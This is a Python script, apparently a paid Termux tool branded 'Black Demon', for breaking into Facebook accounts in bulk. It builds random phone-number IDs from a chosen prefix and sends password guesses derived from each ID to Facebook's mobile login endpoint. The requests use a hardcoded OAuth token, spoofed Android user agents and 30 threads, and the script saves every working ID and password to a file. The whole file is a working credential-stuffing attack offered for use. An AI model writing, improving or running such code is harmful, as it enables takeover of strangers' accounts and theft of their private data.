fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python AWAN.py')
    


logo = """\033[1;97m
  d8888b. d88888b .88b  d88.  .d88b.  d8b   db 
  88  `8D 88'     88'YbdP`88 .8P  Y8. 888o  88 
  \x1b[1;91m88   88 88ooooo 88  88  88 88    88 88V8o 88 
  \x1b[1;91m88   88 88~~~~~ 88  88  88 88    88 88 V8o88 
  \x1b[1;97m88  .8D 88.     88  88  88 `8b  d8' 88  V888 
  Y8888D' Y88888P YP  YP  YP  `Y88P'  VP   V8P 
\33[1;37m-----------------------------------------------
[*] Owner     :  Black Demon
[*] GitHub    :  https://github.com/Black-demon
[*] Status    :  Paid
[*] Version   :  1.0
\33[1;37m-----------------------------------------------
     Don't minimize termux during Cloning
\33[1;37m----------------------------------------------"""
#
def linex():
    print('\33[1;37m--------------------------------------------')
def clear():
    os.system('clear')
    print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def ua():
   wodot = str(random.randint(1111111,9999999))
   wdot = str(random.randint(10,99))+".0.0."+str(random.randint(1000,5000))
   uaa = '[FBAN/FB4A;FBAV/'+wdot+';FBBV/'+wodot+';'
   ua = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/332.2.0.42.70;FBBV/483985217;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
   uaa=uaa+"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/ETISALAT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
   return uaa

def pak():
        user=[]
        clear()
        print('\033[1;37m Code : 0306,0315,0335,0345')
        linex()
        code = input('\033[1;37m put code: ')
        try:
            limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
        except ValueError:
            limit = 5000
        clear()
        lp = input(f'[?] Total Password? : ')
        if lp.isnumeric():
            passlist=['abc','bcd']
            clear()

            for x in range(int(lp)):
               passlist.append(input(f'[{x+1}] Password : '))
        else:
           print(f"{oo('!')}Numeric Only");time.sleep(0.8)
        for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
        with tred(max_workers=30) as AWAN:    
            clear()
            tl = str(len(user))
            print('[•] Total Ids : '+tl)
            print('[•] Your Choice Code : '+code)
            print('\x1b[1;91m[•] Use flight mode for speed up')
            linex()
            for psx in user:
                ids = code+psx
                AWAN.submit(AWAN3,ids,passlist,tl)
                  

                
def AWAN3(ids,passlist,tl):
        global loop
        global oks
        sys.stdout.write(f'\r \x1b[1;97m[MR.DEMON]\033[1;97m{str(loop)} \033[1;37m| OK |\033[1;32m {str(len(oks))}')
        sys.stdout.flush()
        loop+=1
        try:
                for pas in passlist:
                        pas=pas.replace('abc',ids[4:]).replace('bcd',ids)
                        heads = ua()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16))).upper()
                        device_id = str(uuid.uuid4())                
                        data={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
                        headers={'Authorization': 'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': heads, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}                        
                        po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                else:
                                        print('\r\r\033[1;32m [DEMON-OK] '+str(uid)+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/AWAN-IDS/Random.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                      
        except Exception as e:
                time.sleep(10)
                pass


pak()
